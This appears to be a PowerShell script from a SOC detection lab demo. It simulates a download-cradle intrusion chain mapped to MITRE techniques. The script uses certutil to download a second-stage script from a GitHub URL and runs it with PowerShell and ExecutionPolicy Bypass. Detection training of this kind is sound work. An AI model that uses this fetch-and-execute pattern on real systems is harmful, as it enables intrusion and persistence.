# ============================================================================
# run-chain.ps1  —  Download-cradle attack chain (SOCFortress CoPilot demo)
# ----------------------------------------------------------------------------
# Simulates a common intrusion pattern end to end so you can watch your SIEM
# stack detect it and then investigate with Velociraptor:
#
#   1. certutil (a trusted, signed Windows LOLBin) downloads a second stage
#   2. PowerShell executes the downloaded second stage
#   3. the second stage drops a masqueraded binary + sets Run-key persistence
#
# Every payload here is BENIGN (a notepad copy and some text files).
# LAB USE ONLY. Run only on a machine you own and intend to investigate.
#
# MITRE: T1105 (Ingress Tool Transfer), T1059.001 (PowerShell),
#        T1036 (Masquerading), T1547.001 (Run Key)
# ============================================================================

# --- CONFIG: point this at the raw URL of stage2.ps1 in this repo -----------
$Stage2Url = "https://raw.githubusercontent.com/socfortress1/CoPilot-Demo-Lab/main/simulate/stage2.ps1"
$Stage2Local = "C:\Users\Public\stage2.ps1"
# ----------------------------------------------------------------------------

Write-Host "=== SOCFortress CoPilot demo — download-cradle chain ===" -ForegroundColor Cyan
Write-Host "LAB ONLY. Benign payloads. Ctrl+C now if this isn't your lab box." -ForegroundColor Yellow
Start-Sleep -Seconds 2

# -- STAGE 1: download cradle via certutil (T1105) ---------------------------
# A certificate utility has no business pulling files off the web. That is the
# whole tell. Fires Sysmon 1 (process), 22 (DNS), 3 (network), 11 (file create).
Write-Host "`n[stage1] certutil download cradle..." -ForegroundColor Green
certutil.exe -urlcache -split -f "$Stage2Url" "$Stage2Local"

# -- STAGE 2: execute what just landed (T1059.001) ---------------------------
# Download + immediate execute with ExecutionPolicy Bypass, seconds apart.
Write-Host "`n[stage2] executing downloaded second stage..." -ForegroundColor Green
powershell.exe -ExecutionPolicy Bypass -File "$Stage2Local"

Write-Host "`n=== chain complete ===" -ForegroundColor Cyan
Write-Host "Now investigate the host in CoPilot / Velociraptor." -ForegroundColor Cyan
Write-Host "See velociraptor/investigation.md for the artifacts to run." -ForegroundColor Cyan
